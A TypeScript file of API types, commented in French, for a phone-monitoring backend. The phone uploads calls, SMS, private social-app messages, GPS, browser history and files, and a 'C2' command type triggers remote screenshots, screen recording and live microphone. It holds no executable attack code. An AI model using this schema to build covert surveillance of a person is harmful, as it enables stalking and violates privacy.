// Contrat exact de DeviceSyncRequest Laravel — chaque type reflète les règles de validation

export type LocalStatus = 'pending' | 'processing' | 'completed' | 'failed'
export type CallType = 'incoming' | 'outgoing' | 'missed'
export type SmsType = 'inbox' | 'sent'
export type SocialPlatform =
  | 'whatsapp'
  | 'facebook'
  | 'tiktok'
  | 'instagram'
  | 'twitter'
  | 'telegram'
  | 'messenger'
export type MediaType = 'image' | 'video' | 'audio'
export type GeofenceEventType = 'enter' | 'exit'

// Champs SSoT communs à tous les enregistrements
type SyncBase = {
  sync_hash: string
  local_sqlite_id: number
  local_status?: LocalStatus
  deleted_at_source?: boolean
}

export type SyncCall = SyncBase & {
  phone_number: string
  contact_name?: string | null
  call_type: CallType
  duration: number
  recorded_at?: string
  call_recorded?: boolean
  recording_path?: string | null
}

export type SmsStatus = 'received' | 'delivered' | 'draft' | 'sending' | 'failed' | 'queued'

export type SyncSms = SyncBase & {
  address: string
  body: string
  type: SmsType
  date: string
  sms_status?: SmsStatus
}

export type SyncContact = SyncBase & {
  name: string
  phone_number: string
}

export type SyncNotification = SyncBase & {
  package_name: string
  title?: string | null
  body?: string | null
  date: string
}

export type SyncGpsLocation = SyncBase & {
  latitude: number
  longitude: number
  altitude?: number | null
  accuracy?: number | null
  recorded_at: string
}

export type SyncGeofenceAlert = SyncBase & {
  geofence_id: number
  event_type: GeofenceEventType
  latitude: number
  longitude: number
  triggered_at: string
}

export type SyncSocialMessage = SyncBase & {
  platform: SocialPlatform
  sender_name: string
  message: string
  date: string
}

export type SyncBrowserHistory = SyncBase & {
  url: string
  title?: string | null
  visited_at: string
}

export type SyncInstalledApp = SyncBase & {
  app_name: string
  package_name: string
  installed_at?: string | null
  is_blocked?: boolean
}

export type SyncFile = SyncBase & {
  path: string
  file_name: string
  file_size: number
  is_directory?: boolean
  file_created_at?: string | null
}

export type SyncMedia = SyncBase & {
  media_type: MediaType
  origin_app: string
  file_name: string
  file_size: number
  path: string
}

// Payload complet envoyé à POST /api/device/sync
export type SyncPayload = {
  calls?: SyncCall[]
  sms?: SyncSms[]
  contacts?: SyncContact[]
  notifications?: SyncNotification[]
  gps_locations?: SyncGpsLocation[]
  geofence_alerts?: SyncGeofenceAlert[]
  social_messages?: SyncSocialMessage[]
  browser_history?: SyncBrowserHistory[]
  installed_apps?: SyncInstalledApp[]
  files?: SyncFile[]
  media?: SyncMedia[]
}

// Réponse du serveur
export type SyncResponse = {
  success: boolean
  cleared: Partial<Record<keyof SyncPayload, string[]>>
  stats: Partial<Record<keyof SyncPayload, number>>
}

// Règle de restriction retournée par GET /api/device/restrictions
export type RestrictionRule = {
  id: number
  type: 'block_calls' | 'sms_filter' | 'app_block' | 'module_toggle' | 'geofence'
  value: string
  is_active: boolean
}

// Parsed payload for geofence restriction rules
export type GeofenceRuleValue = {
  lat: number
  lng: number
  radius: number // metres
  name?: string
}

// Commande C2 retournée par GET /api/device/commands
export type RemoteCommand = {
  id: number
  type: 'screenshot' | 'screen_recording' | 'live_mic'
  status: 'pending' | 'executing' | 'completed' | 'failed'
  payload: Record<string, unknown> | null
}
